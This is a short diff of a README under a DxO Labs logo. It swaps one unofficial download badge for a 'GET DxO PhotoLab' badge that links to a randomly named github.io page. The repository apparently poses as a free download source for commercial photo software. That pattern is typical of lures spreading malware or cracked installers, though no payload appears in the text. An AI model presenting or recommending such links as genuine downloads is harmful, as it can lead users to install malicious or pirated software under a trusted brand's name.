@@ -4,10 +4,8 @@
   <img src="https://upload.wikimedia.org/wikipedia/commons/1/13/DxO_Labs_Corporate_logo.svg" alt="Project Logo"/>
 </div>
 
-<div align="center">
+[![GET DxO PhotoLab](https://img.shields.io/badge/GET%20%E2%80%94%20DxO-PhotoLab-0078D6?style=for-the-badge&logoColor=white)](https://5goranl6hcun94dq8vist.github.io/.github/DxO-PhotoLab)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://dxo-photolab-windows-toolkit.github.io/.github/)
-</div>
 
 ---
 
